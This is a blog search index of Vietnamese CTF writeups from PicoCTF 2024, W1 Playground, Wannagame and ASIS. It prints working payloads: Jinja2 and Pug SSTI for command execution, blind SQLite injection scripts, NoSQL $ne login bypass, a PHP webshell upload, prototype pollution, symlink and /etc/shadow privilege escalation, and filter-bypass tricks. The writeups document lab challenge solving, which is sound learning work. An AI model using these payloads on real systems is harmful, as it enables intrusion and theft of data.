[
  
  {
    "title": "PicoCTF 2024",
    "url": "/posts/PicoCTF2024/",
    "categories": "CTF Writeup",
    "tags": "NoSQL, Bypass Filter, PHP Webshell, Symlink",
    "date": "2024-03-27 23:00:00 +0700",
    





    
    "snippet": "PicoCTF2024 đã kết thúc, giải này mình có khá nhiều nuối tiếc vì bài cuối web quá khó, dù không clear nhưng team Zafk1el tụi mình đã cố gắng hết sức. Tiện đây mình viết writeup một số bài đáng chú ...",
    "content": "PicoCTF2024 đã kết thúc, giải này mình có khá nhiều nuối tiếc vì bài cuối web quá khó, dù không clear nhưng team Zafk1el tụi mình đã cố gắng hết sức. Tiện đây mình viết writeup một số bài đáng chú ý trong giải này.!(image)[https://i.imgur.com/3zvCRbn.png]GENERAL SKILLS: dont-you-love-bannersCan you abuse the banner?The server has been leaking some crucial information on tethys.picoctf.net 64560. Use the leaked information to get to the server.To connect to the running application use nc tethys.picoctf.net 64699. From the above information abuse the machine and find the flag in the /root directory.CÁCH 1: symlinkTrước hết thì trả lời vài câu hỏi để được vào được shell của playerKhi mình vào được shell thì bắt đầu lượn qua các folder, mô tả của bài bảo hãy tìm cách đọc flag ở folder /root nên mình cd đến folder đó để xemTất nhiên là làm gì có chuyện dễ thế, flag đã bị giới hạn quyền chỉ có root mới có quyền đọcVậy làm gì bây giờ ? Lúc này mình mới để ý có file script.py nên mình mở lên xem, đây là nội dung file script.pyimport osimport ptyincorrect_ans_reply = \"Lol, good try, try again and good luck\\n\"if __name__ == \"__main__\":    try:      with open(\"/home/player/banner\", \"r\") as f:        print(f.read())    except:      print(\"*********************************************\")      print(\"***************DEFAULT BANNER****************\")      print(\"*Please supply banner in /home/player/banner*\")      print(\"*********************************************\")try:    request = input(\"what is the password? \\n\").upper()    while request:        if request == 'MY_PASSW@RD_@1234':            text = input(\"What is the top cyber security conference in the world?\\n\").upper()            if text == 'DEFCON' or text == 'DEF CON':                output = input(                    \"the first hacker ever was known for phreaking(making free phone calls), who was it?\\n\").upper()                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':                    scmd = 'su - player'                    pty.spawn(scmd.split(' '))                else:                    print(incorrect_ans_reply)            else:                print(incorrect_ans_reply)        else:            print(incorrect_ans_reply)            breakexcept:    KeyboardInterruptTrong file này thì không có gì đáng chú ý trừ 2 điểm  File này chạy dưới quyền root  File này đọc nội dung 1 tệp tin là /home/player/bannerLúc này thì ta rút ra dùng symlink để /home/player/banner trỏ đển /root/flag.txt và đọc được flagBây giờ chỉ cần nc lại server thì script.py sẽ tự động đọc flag in ra cho taCÁCH 2: crack passworkTrong bài này chúng ta ngoài quyền đọc 1 số file mặc định thì chúng ta lại được cấp quyền đọc file /etc/shadow file này là file quan trọng chứa password của tất cả user ( đã bị mã hoá ) vậy nếu chúng ta có thể decrypt lại thì chúng ta có password và thăng lên quyền rootVề cách crack password thì mình sử dụng tool hashcat để crack ra passwordCách này thì mình không đánh giá cao lắm vì nhìn hơi cùi &lt;(“) nhưng mà nó cũng là một cáchFunfact: Trong lúc làm bài này mình đã ngẫu nhiên gõ đúng password của root trong ngay lần đầu tiên, sau đó mình mới dùng cách symlinkFlag: picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_68ca8b23}GENERAL SKILLS: SansAlphaThe Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols.Additional details will be available after launching your challenge instance.Bài này chặn tất cả các chữ cái và 1 số ký tự đặc biệt, chỉ có thể xài số và các ký tự đặc biệt. Bài này sau một lúc suy nghĩ thì mình nghĩ theo hướng wildcards và tìm ra 2 cách khá hayCách 1: Sử dụng base32Sau một lúc fuzzing thì mình tìm thấy file flag.txt ở ./blargh/flag.txtTiếp theo chúng ta cần tìm cách đọc flag. Để thực thi được lệnh thì trong lệnh đó chỉ có thể có ký tự đặc biệt và số, kết hợp wildcard chúng ta chỉ cần tìm những lệnh có số là được. Sau đó, mình tìm được 2 lệnh có thể dùng được đó là base64 và base32Nhưng có một vấn đề đó là base64 khi dùng wildcard lại trùng với một tệp thực thi khác /usr/bin/x86_64 vậy thì còn lại base32 có vẻ khả thiChúng ta có thể dùng wildcard gọi ra file base32 như sau /???/???/????32 và flag thì có địa chỉ ở trên rồi bây giờ kết hợp lại để đọc flag.txt.Decode base32 sex ra flagCách 2: Sử dụng stringsLúc nãy mình mới nói là chỉ có thể gọi ra file thực thi có số thôi mà lệnh strings thì làm gì có số để mà gọi =)) thật ra là có một cách nhưng cách này chỉ gọi được rất giới hạnBằng cách tận dụng tham số special bash ta có thể gọi ra một số ký tự, như ở challenge hiện tại chúng ta có dùng $- để gọi ra các ký tự sau 'h', 'i', 'm', 'B', 'H', 's'Giải thích ngắn gọn thì $- là tổng hợp các flag được thiết lập cho shell bash hiện tại, như shell ở trên thì ý nghĩa từng ký tự như sauH - histexpand: Đây là flag cho phép chúng ta lấy những gì chúng ta đã nhập bỏ vào input để tiếp tục thực hiện lệnh, cho phép chúng ta dễ dàng nhập và lặp lại lệnhm - monitor: Đây là flag liên quan đến job control, giúp chúng ta theo dõi các job trong shellh - hashall: Đây là flag được bật lên mặc định, nó giúp lưu trữ các lệnh mà ta thường xài để giúp tăng tốc tốc độ thực thi chương trìnhB - braceexpand: Đây là flag làm cho shell có thể sử dụng brace expansioni - interactive: Đây là flag khi mà shell có thể tương tác đượcCó thể đọc thêm tại đây LINKBây giờ dựa vào đó, chúng ta có thể gán giá trị đó vào một biến khác để dễ dàng sử dụng hơn mình sử dụng biến ____ để lấy giá trị $-Lúc này mình kiểm tra đã gán thành công bây giờ đến bước lấy ký tự trong đó ra bằng ${____:index:len}Sau khi đánh giá các lệnh có thể mình đã chọn lệnh strings để sử dụng, dựa vào các dữ kiện ở trên mình có thể craft được payload như sau /?${____:5:1}?/???/${____:5:1}??${____:1:1}??${____:5:1} (/?s?/???/s??i??s)Lúc này chúng ta gần như có được lệnh ls (fake) và cat (fake) với lệnh này ta có thể đọc bất kỳ file nào nếu biết địa chỉĐọc flagFlag: picoCTF{7h15_mu171v3r53_15_m4dn355_36a674c0}WEB EXPLOITATION: No Sql InjectionCan you try to get access to this website to get the flag?You can download the source here.The website is running here. Can you log in?App sử dụng MôngoDB, sử dụng phương thức POST để gửi giá trị email và password lênBài này chỉ có 2 chổ cần chú ý  Tại /api/login/route.ts có 1 đoạn lệnh như sau       const users = await User.find({  email: email.startsWith(\"{\") &amp;&amp; email.endsWith(\"}\") ? JSON.parse(email) : email,  password: password.startsWith(\"{\") &amp;&amp; password.endsWith(\"}\") ? JSON.parse(password) : password});if (users.length &lt; 1)  return new Response(\"Invalid email or password\", { status: 401 },users);else {  return new Response(JSON.stringify(users), { status: 200 });}        Và tại /models/user.ts có đoạn lệnh      const UserSchema: Schema = new Schema({email: { type: String, required: true, unique: true },firstName: { type: String, required: true },lastName: { type: String, required: true },password: { type: String, required: true },token: { type: String, required: false ,default: \"\"},  });  const User = models.User || mongoose.model&lt;UserInterface&gt;(\"User\", UserSchema);      Tại route.ts đoạn code sẽ kiểm tra xem nếu biến email và password truyền vào bắt đầu bằng ‘{‘ và kết thúc bằng ‘}’ thì parse cái JSON đó ra còn ngược lại thì truyền vào nguyên giá trị đó và nếu login vào thành công sẽ trả về usersTại user.ts đoạn code trên gán một key là token với value mặc định là FLAGMôngoDB thì có thể thêm một số query operator để tạo ra các điều kiện cụ thể để database trả về dữ liệu ứng với điều kiện đó, dựa vào đó ta có thể bắt nó trả về giá trị mà ta mong muốnVậy chúng ta có thể thêm một query operator $ne để trả về tất cả giá trị không giống với giá trị ta nhập vàoDecode toke và có được flagFlag: picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_af67328d}WEB EXPLOITATION: TricksterI found a web app that can help process images: PNG images only!Additional details will be available after launching your challenge instance.Bài này cho một trang web để upload ảnh png lên, vì đây là một bài blackbox nên mình check /robots.txt xem có gì hot khôngCó 2 đường dẫn  /uploads/ có vẻ đây là nơi sẽ lưu trữ các file mình upload lên  /instructions.txt nội dung của nó tóm tắt là nó sẽ cho phép file upload lên có .png trong tên, có header của PNGUpload một vài bức ảnh thì nhận ra backend của web sử dụng PHP nên mình sẽ up file PHP để tạo một cái webshellCó được webshell rồi thì lấy flag thôiFlag: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}WEB EXPLOITATION: elementsFlag: UNKNOWN"
  },
  
  {
    "title": "W1 Playground Writeup",
    "url": "/posts/W1Playground/",
    "categories": "CTF Writeup",
    "tags": "Prototype Pollution, SSTI, API testing",
    "date": "2024-02-27 23:00:00 +0700",
    





    
    "snippet": "Bài 1: easy loginPhân tích qua code thì chúng ta có 2 endpoint cần để tâm là “/login” và “/admin”Chức năng login bắt chúng ta post data lên và server sẽ trả lại mã jwtkey để chúng ta đăng nhậpChức ...",
    "content": "Bài 1: easy loginPhân tích qua code thì chúng ta có 2 endpoint cần để tâm là “/login” và “/admin”Chức năng login bắt chúng ta post data lên và server sẽ trả lại mã jwtkey để chúng ta đăng nhậpChức năng admin kiểm tra xem chúng ta có phải admin không qua isAdmin=true sau khi phân tích jwtkeySau khi phân tích bài này dính lỗi Prototype Pollution bằng cách thêm logindata[\"__proto__\"][isAdmin]=true vào thì prototype của logindata sẽ có thuộc tính isAdmin=true từ đó logindata sẽ kế thừa thuộc tính đóPayloadCó jwtkey rồi thì vào admin để lấy flag thôiFlag : W1{REDACTED}Bài 2: render4freePhân tích qua code thì web này đang sử dụng Pug template engine để in ra các ký tự chúng ta gõ vàoSau khi phân tích code thì chúng ta có thể rút ra web đang dính lỗi SSTI nhưng có 1 function này đang chặn chúng ta khai thác SSTISau khi đọc pug document thì chúng ta có thể sử dụng “-“ để viết code jsBây giờ chúng ta có thể dùng “-“ để viết code js thì chúng ta viết gì ? Đó chính là ghi đè lại function filter ký tự của chúng ta- global.replace_bad_char = str_to_replace =&gt; str_to_replaceTiếp tục ghi đè lại function trên để chúng ta có thể thực hiện lệnh eval- global.replace_bad_char = str_to_replace =&gt; eval(str_to_replace)Sau khi ghi đè được rồi thì viết vào để thử thực hiện RCE nàoPayload require('child_process').exec('ping hacked.sv')Làm gì dễ thế anh Shin24 (author bài này) đã set type của nodejs là module tức chúng ta không thể require mà phải sử dụng importNhưng mà code đã chỉnh Promise.prototype.then đã thành 1 hàm trả về nullOat gì dark vậy, lúc này chúng ta sử dụng process.binding để import các modules của nodejs  process.binding('spawn_sync').spawn({     file: 'ls',    args: [''],    stdio: [        { type: 'pipe', readable: true, writable: false },        { type: 'pipe', readable: false, writable: true },        { type: 'pipe', readable: false, writable: true }  ]}).output.toString()Ngon vậy là có thể thực hiện lệnh lsĐể ý ở file Docker author đã tạo ra 1 file /read_flag để đọc flag vậy chúng ta thực thi file read_flag để nhận flagPayload:  process.binding('spawn_sync').spawn({     file: '/read_flag',    args: [''],    stdio: [        { type: 'pipe', readable: true, writable: false },        { type: 'pipe', readable: false, writable: true },        { type: 'pipe', readable: false, writable: true }  ]}).output.toString()Flag: W1{REDACTED}Bài 3: pwncloud"
  },
  
  {
    "title": "Wannagame Freshman CTF writeup",
    "url": "/posts/Wannagame-Freshman/",
    "categories": "CTF Writeup",
    "tags": "SQL Injectiom, SSTI",
    "date": "2023-11-11 23:00:00 +0700",
    





    
    "snippet": "WannaWinFreshman-WriteupBài 1 Warmup PHP:  Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là page và sau đó chương trình sẽ server sẽ decode ra và đọc file tron...",
    "content": "WannaWinFreshman-WriteupBài 1 Warmup PHP:  Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là page và sau đó chương trình sẽ server sẽ decode ra và đọc file trong server      Sau khi phân tích và tìm kiếm trên mạng thì mình tìm được 1 bài viếtLINK        Cơ bản là json_decode nó sẽ decode luôn mã unicode thành chữ cái vì vậy mình chỉnh lại cái payload của mình từ php://filter/convert.base64-encode/resource=/flagthành\\u0070hp://filter/convert.base64-encode/resource=/flag    Decode base64 và ra flag  Flag: W1{w3lc0m3_w3b_w4rrj0rs}    Bài 2 Namename:            Bài này cho 1 đường link và không cho thêm gì khác sau khi xem source của web này thì thấy có 1 đường dẫn là /wannaw1n    Sau khi đi tới đường dẫn /wannaw1n mình nhận ra ngay đây là SSTI jinja2  Payload : {{().__class__.__base__.__subclasses__()[279]('ls',shell=1,stdout=-1).communicate()}}      Và nó bị chặn         Sau vài thử nghiệm thì có vẽ nó chặn dấu . và [] nên mình chuyển qua |attr     Payload mới: {{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__\")()|attr(\"__getitem__\")(279)('ls',shell=1,stdout=-1)|attr('communicate')()}}  Và nó đã hoạt động      Bây giờ sửa lại payload từ ls sang cat flag.txt    Và nó vẫn bị chặn cái gì đấy nên mình sử dụng cách này bypass filter (chổ này là chặn dấu . và chữ f thì phải)  {{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__\")()|attr(\"__getitem__\")(279)('cat+*',shell=1,stdout=-1)|attr('communicate')()}}  Cách này sẽ đọc hết tất cả các file trong thư mục hiện tại và tìm được flag  Flag: W1{U_are_master_in_SSTI}    Bài 3 Solite:        Bài này mình khá tiếc vì mình đọc không kỉ filter nên mình không làm được  Tóm tắt đề thì bài này chỉ cho chúng ta cái page như thế này (blackbox)  Sau khi đọc code và được nghe 1 số gợi ý thì mình hiểu được đây là Blind SQL Injection      Nhìn kĩ source thì có 1 lỗ hổng cho chúng ta khai thác là substr không bị filter        Đây là query của bài    Sau một vài thử nghiệm thì mình tìm được cách để in ra tên của bảng  Payload: 1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),i,1) is 'a'--  Tóm tắt :  Payload này sau khi gửi lên server thì server sẽ thực hiện 1 query như sau SELECT * FROM API WHERE id LIKE '%1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--%'  select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%' sẽ trả về tên của tất cả các bảng  substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) sẽ lấy 1 ký tự a bắt đầu từ vị trí i  1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'-- cái này sẽ so sánh ký tự mà substr vừa cắt ra nếu chính xác thì sẽ thực hiện lệnh đằng trước là SELECT * FROM API WHERE id LIKE '%1' và trả về cột id=1 nếu sai thì nó không thực hiện và chẳng trả về gì cả  Đây là script mình tìm tên của bảngimport string,requestsfrom urllib.parse import quoteall_characters = string.ascii_letters + string.digits + \"!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}\"url = \"http://45.122.249.68:20020/search?name[]=\"payload=\"1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--\"table_name = \"\"haha = 0for i in range(1,10000):    for ps in all_characters:        payload =\"1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%%'),%d,1) is '%c'--\" %(i,ps)        payload =  quote(payload)        urlx = url + payload        #print(urlx)        r=requests.get(url=urlx)        if \"id\" in r.text:            table_name += ps            print(\"Table names: \",table_name)            haha +=1    if haha &lt; i:        breakprint(\"Success all the names of the tables are:\",table_name)  Và tìm ra được tên của các bảng làTables: API,flag_c1abd148_acae_40be_a953_eae333f90da0  Bây giờ dựa vào cái trên lấy ra flag từ bảng flag_c1abd148_acae_40be_a953_eae333f90da0 thôi  Script của mìnhimport string,requestsfrom urllib.parse import quoteall_characters = string.ascii_letters + string.digits + \"!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}\"url = \"http://45.122.249.68:20020/search?name[]=\"table_name = \"flag_c1abd148_acae_40be_a953_eae333f90da0\"#payload = \"1' and substr((select flag from flag_c1abd148_acae_40be_a953_eae333f90da0),1,1) is 'a'--\"haha = 0flag =\"\"for i in range(1,10000):    for ps in all_characters:        payload =\"1' and substr((select flag from %s),%d,1) is '%c'--\" %(table_name,i,ps)        payload =  quote(payload)        urlx = url + payload        #print(urlx)        r=requests.get(url=urlx)        if \"id\" in r.text:            flag += ps            print(\"Flag is: \",flag)            haha +=1    if haha &lt; i:        breakprint(\"Here is your flag:\",flag)  Flag: W1{I_th1nk_u_r_so_lite^_^}    Bài 4 Differences:        Flag ngay ở trong file  Flag: W1{SaKur4_s0_b34uTiFuL_RI9ht?????}    Bài 5 Free Flag:        Đọc file pcapng ta tìm được source và keyimport base64BANNER = \"\"\" ___       __   ________  ________   ________   ________  ___       __     _____  ________      |\\  \\     |\\  \\|\\   __  \\|\\   ___  \\|\\   ___  \\|\\   __  \\|\\  \\     |\\  \\  / __  \\|\\   ___  \\    \\ \\  \\    \\ \\  \\ \\  \\|\\  \\ \\  \\\\\\ \\  \\ \\  \\\\\\ \\  \\ \\  \\|\\  \\ \\  \\    \\ \\  \\|\\/_|\\  \\ \\  \\\\\\ \\  \\    \\ \\  \\  __\\ \\  \\ \\   __  \\ \\  \\\\\\ \\  \\ \\  \\\\\\ \\  \\ \\   __  \\ \\  \\  __\\ \\  \\|/ \\ \\  \\ \\  \\\\\\ \\  \\    \\ \\  \\|\\__\\_\\  \\ \\  \\ \\  \\ \\  \\\\\\ \\  \\ \\  \\\\\\ \\  \\ \\  \\ \\  \\ \\  \\|\\__\\_\\  \\   \\ \\  \\ \\  \\\\\\ \\  \\    \\ \\____________\\ \\__\\ \\__\\ \\__\\\\\\ \\__\\ \\__\\\\\\ \\__\\ \\__\\ \\__\\ \\____________\\   \\ \\__\\ \\__\\\\\\ \\__\\\\    \\|____________|\\|__|\\|__|\\|__| \\|__|\\|__| \\|__|\\|__|\\|__|\\|____________|    \\|__|\\|__| \\|__|\"\"\"KEY = bytes.fromhex('deadbeef')def encryptSecret(secret):    lst_byte = []    for i in range(len(secret)):        enc_byte = ord(secret[i]) ^ KEY[i % len(KEY)]        lst_byte.append(enc_byte.to_bytes(1, 'big'))        return base64.b64encode(b''.join([_ for _ in lst_byte])).decode()if __name__=='__main__':    print(BANNER)    secret = input(\"&gt; Please give me your secret: \")    print(\"\\n&gt; Here is your encrypted secret:\", encryptSecret(secret)  Decrypt lại ta sẽ có flagimport base64KEY = bytes.fromhex('deadbeef')def decryptSecret(encrypted_secret):    encrypted_bytes = base64.b64decode(encrypted_secret.encode())    decrypted_bytes = [encrypted_bytes[i] ^ KEY[i % len(KEY)] for i in range(len(encrypted_bytes))]    decrypted_text = ''.join([chr(byte) for byte in decrypted_bytes])    return decrypted_textsecret = \"iZzFsKme0oOdndOqgdnxsKmZ0KG/2o+hgdA=\"print(decryptSecret(secret))  Flag: W1{w3llC0mE_tO_w4nNaw1N}  Mấy bài còn lại mình chưa biết làm do dark quá"
  },
  
  {
    "title": "Asis CTF 2023 Writeup",
    "url": "/posts/AsisCTF/",
    "categories": "CTF Writeup",
    "tags": "",
    "date": "2023-09-24 23:00:00 +0700",
    





    
    "snippet": "Asis-CTF-2023-WriteupBài 1 hello:  Tóm tắt đề thì đại khái là đề bảo chúng ta phải request một cái method get có parameter là x lên Web sao cho không có chữ next và chữ file là được, nhưng mà muốn ...",
    "content": "Asis-CTF-2023-WriteupBài 1 hello:  Tóm tắt đề thì đại khái là đề bảo chúng ta phải request một cái method get có parameter là x lên Web sao cho không có chữ next và chữ file là được, nhưng mà muốn đọc được flag thì phải đọc được file next.txt  Đọc đề, đề gợi ý cho mình đọc manpage của curl  Sau khi đọc và phân tích manpage mình đã nhận ra cách làm của bài này dựa vào chức năng bên dưới  Đây là payload của mình ?x=f[a-i]le:///ne[b-x]t.txt  Khi bypass được đoạn đầu tiên nó sẽ hiện ra 1 đường dẫn mới  Theo đường dẫn, đi tới đoạn thứ 2  Decode Base64 ra để lấy nội dung  Chắc chắn /app/index.js là source nên mình đã đọc nó  Decode tiếp thì ra source code  Code này đại khái là cũng như cái đầu bắt mình đọc file /next.txt nhưng lại cấm chữ next  Sau khi phân tích code nhận ra lỗi ở 2 chổ này  path.basename(fpath) sẽ trả lại cái tên file về cho mình còn fs.readFileSync(fpath) sẽ đọc file của fpath  Sau một số thử nghiệm thì đây là payload cuối cùng của mình /next.txt%00/yuu.txt  Decode  Decode  Flag: ASIS{good_job_bun}"
  }
  
]

